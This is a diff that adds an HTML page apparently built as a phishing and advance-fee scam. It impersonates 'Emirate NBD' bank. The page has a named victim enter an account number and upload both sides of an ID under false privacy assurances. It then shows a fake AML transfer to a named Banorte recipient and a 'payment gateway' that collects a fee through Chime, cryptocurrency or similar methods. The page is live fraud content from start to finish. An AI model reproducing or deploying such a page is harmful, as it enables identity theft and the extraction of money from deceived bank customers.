@@ -1,0 +1,392 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>emirateaml</title>
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <!-- NAVBAR -->
+
+    <nav class="navbar navbar-expand-lg bg-white shadow-sm">
+        <div class="container">
+
+            <a class="navbar-brand fw-bold text-primary" href="#">
+                EMIRATE NBD
+            </a>
+
+            <span class="badge text-bg-primary">AML</span>
+
+        </div>
+    </nav>
+
+
+    <main class="container py-5">
+
+
+        <!-- PAGE 1: ACCOUNT NUMBER -->
+
+        <section id="accountPage" class="payment-card">
+
+            <div class="icon-circle">🏦</div>
+
+            <h3>Welcome to Emirate NBD</h3>
+
+            <p class="text-muted">
+                Enter your account number to begin.
+            </p>
+
+            <label class="form-label">Account Number</label>
+
+            <input
+                type="text"
+                id="accountNumber"
+                class="form-control"
+                placeholder="Enter account number"
+            >
+
+            <small id="accountError" class="text-danger"></small>
+
+            <button class="btn btn-primary w-100 mt-4" onclick="checkAccount()">
+                Continue
+            </button>
+
+        </section>
+
+
+        <!-- PAGE 2: ID DOCUMENT PREVIEW -->
+
+        <section id="uploadPage" class="payment-card d-none">
+
+            <div class="icon-circle">🪪</div>
+
+            <h3>Welcome, Irina!</h3>
+
+            <p class="text-muted">
+                This is AML transfer procedure.
+            </p>
+
+            <h5 class="mt-4">Identity Document Preview</h5>
+
+            <p class="small text-muted">
+                Identities are previewed internally and not transmitted.
+            </p>
+
+            <label class="form-label">Front of ID</label>
+
+            <input
+                type="file"
+                id="frontID"
+                class="form-control"
+                accept="image/*"
+                onchange="previewImage(event, 'frontPreview')"
+            >
+
+            <img id="frontPreview" class="id-preview d-none">
+
+
+            <label class="form-label mt-4">Back of ID</label>
+
+            <input
+                type="file"
+                id="backID"
+                class="form-control"
+                accept="image/*"
+                onchange="previewImage(event, 'backPreview')"
+            >
+
+            <img id="backPreview" class="id-preview d-none">
+
+
+            <div class="security-note mt-4">
+
+                <strong>Privacy information</strong>
+
+                <p class="small mb-0">
+                    Your Identity is save with us and will be deleted from database 20 minutes after verification.
+                </p>
+
+            </div>
+
+            <button class="btn btn-primary w-100 mt-4" onclick="startVerification()">
+                Continue
+            </button>
+
+        </section>
+
+
+        <!-- PAGE 3: LOADING -->
+
+        <section id="loadingPage" class="payment-card text-center d-none">
+
+            <div class="spinner-border text-primary spinner-large"></div>
+
+            <h4 class="mt-4">Processing...</h4>
+
+            <p class="text-muted">
+                Please wait.
+            </p>
+
+        </section>
+
+
+        <!-- PAGE 4: SUCCESS -->
+
+        <section id="successPage" class="payment-card text-center d-none">
+
+            <div class="success-icon">✓</div>
+
+            <h3>Verification Successful</h3>
+
+            <p class="text-muted">
+                The process is complete.
+            </p>
+
+            <button class="btn btn-primary w-100 mt-3" onclick="showPage('transferPage')">
+                Continue
+            </button>
+
+        </section>
+
+
+        <!-- PAGE 5: TRANSFER DETAILS -->
+
+        <section id="transferPage" class="payment-card d-none">
+
+            <div class="icon-circle">💸</div>
+
+            <h3>Transfer Summary</h3>
+
+            <p class="text-muted">
+                Review the transaction details.
+            </p>
+
+            <label class="form-label">Amount</label>
+
+            <div class="input-group mb-4">
+
+                <span class="input-group-text">AED</span>
+
+                <input
+                    type="number"
+                    id="transferAmount"
+                    class="form-control"
+                    min="1"
+                    placeholder="Enter amount"
+                >
+
+            </div>
+
+
+            <div class="account-details">
+
+                <p class="small text-muted">RECIPIENT</p>
+
+                <div class="detail-row">
+                    <span>Bank Name</span>
+                    <strong>Banorte</strong>
+                </div>
+
+                <div class="detail-row">
+                    <span>Account Number</span>
+                    <strong>1178980918</strong>
+                </div>
+
+                <div class="detail-row">
+                    <span>Account Name</span>
+                    <strong>Guillermo Tello Ludlow</strong>
+                </div>
+
+            </div>
+
+
+            <button class="btn btn-primary w-100 mt-4" onclick="showPrompt()">
+                Prompt
+            </button>
+
+        </section>
+
+
+        <!-- PAGE 6: CONFIRMATION -->
+
+        <section id="promptPage" class="payment-card d-none">
+
+            <div class="icon-circle">📋</div>
+
+            <h3>Confirm Transfer Details</h3>
+
+            <p class="text-muted">
+                Kindly confirm that the following details are correct.
+            </p>
+
+            <div class="account-details">
+
+                <div class="detail-row">
+                    <span>Amount</span>
+                    <strong id="confirmAmount"></strong>
+                </div>
+
+                <div class="detail-row">
+                    <span>Bank</span>
+                    <strong>Banorte</strong>
+                </div>
+
+                <div class="detail-row">
+                    <span>Account Number</span>
+                    <strong>1178980918</strong>
+                </div>
+
+                <div class="detail-row">
+                    <span>Account Name</span>
+                    <strong>Guillermo Tello Ludlow</strong>
+                </div>
+
+            </div>
+
+            <div class="security-note mt-4">
+
+                <strong>Payment information</strong>
+
+                <p class="small mb-0">
+                    Select a payment method to view its instructions.
+                </p>
+
+            </div>
+
+            <button class="btn btn-primary w-100 mt-4" onclick="showPage('paymentPage')">
+                View Payment Methods
+            </button>
+
+            <button class="btn btn-light w-100 mt-2" onclick="showPage('transferPage')">
+                Edit Transfer Details
+            </button>
+
+        </section>
+
+
+        <!-- PAGE 7: PAYMENT GATEWAY -->
+
+        <section id="paymentPage" class="payment-card d-none">
+
+            <div class="icon-circle">💳</div>
+
+            <h3>Payment Gateway</h3>
+
+            <p class="text-muted">
+                Select a payment method to view its instructions.
+            </p>
+
+
+            <div class="account-details mb-4">
+
+                <p class="text-muted small">FEE</p>
+
+                <h3 id="displayFee">AED 0:00</h3>
+
+            </div>
+
+
+            <label class="form-label">Choose Payment Method</label>
+
+            <select
+                id="paymentMethod"
+                class="form-select"
+                onchange="displayGateway()"
+            >
+
+                <option value="">Select payment method</option>
+
+                <option value="chime">Chime</option>
+
+                <option value="olajuwon">Emirate NBD</option>
+
+                <option value="crypto">Cryptocurrency</option>
+
+            </select>
+
+
+            <div id="gatewayDetails" class="account-details mt-4 d-none">
+
+                <h5 id="gatewayName"></h5>
+
+                <div class="detail-row">
+                    <span>Reference</span>
+                    <strong id="gatewayReference"></strong>
+                </div>
+
+                <div class="detail-row">
+                    <span>Account</span>
+                    <strong id="gatewayAccount"></strong>
+                </div>
+
+                <div class="detail-row">
+                    <span>Account Name</span>
+                    <strong id="gatewayAccountName"></strong>
+                </div>
+
+                <p id="gatewayDescription" class="small text-muted mt-3"></p>
+
+                <button
+                    class="btn btn-primary w-100 mt-3"
+                    onclick="paymentSubmitted()"
+                >
+                    Click here after you have made the payment
+                </button>
+
+            </div>
+
+        </section>
+
+
+        <!-- PAGE 8: SUBMISSION NOTICE -->
+
+        <section id="noticePage" class="payment-card text-center d-none">
+
+            <div class="success-icon">✓</div>
+
+            <h3>Submission Received and beign processed</h3>
+
+            <p class="text-muted">
+                Your submission has been recorded.
+            </p>
+
+            <div class="security-note text-start">
+
+                <strong>Awaiting confirmation</strong>
+
+            </div>
+
+            <button class="btn btn-primary w-100 mt-4" onclick="showPage('paymentPage')">
+                Back to Payment Details
+            </button>
+
+        </section>
+
+
+    </main>
+
+
+    <!-- FOOTER -->
+
+    <footer>
+
+        <p>© 2025 Emirate NBD</p>
+
+        <a href="#">www.emiratenbd.com</a>
+
+    </footer>
+
+
+    <script src="script.js"></script>
+
+</body>
+</html>
